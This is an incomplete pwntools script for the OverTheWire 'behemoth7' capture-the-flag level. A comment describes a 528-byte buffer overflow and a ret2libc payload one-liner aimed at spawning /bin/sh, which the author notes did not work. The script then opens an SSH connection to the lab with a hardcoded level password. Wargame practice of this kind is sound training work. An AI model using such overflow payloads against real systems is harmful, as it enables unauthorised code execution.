from pwn import *


'''
local exploit:

The binary will clear all setted env variables and then it will copy argv[1] in the buffer.
A buffer is large, so, the offset is 528 bytes.
Trying Ret2lib with something like that:
    $(python -c 'print "A"*528 + "\x40\xa0\xe0\xf7" + "\x90\xc9\xdf\xf7" + "/bin/sh"')
It doesn't work.
'''
con = ssh('behemoth7', 'behemoth.labs.overthewire.org', password='baquoxuafo', port=2221)

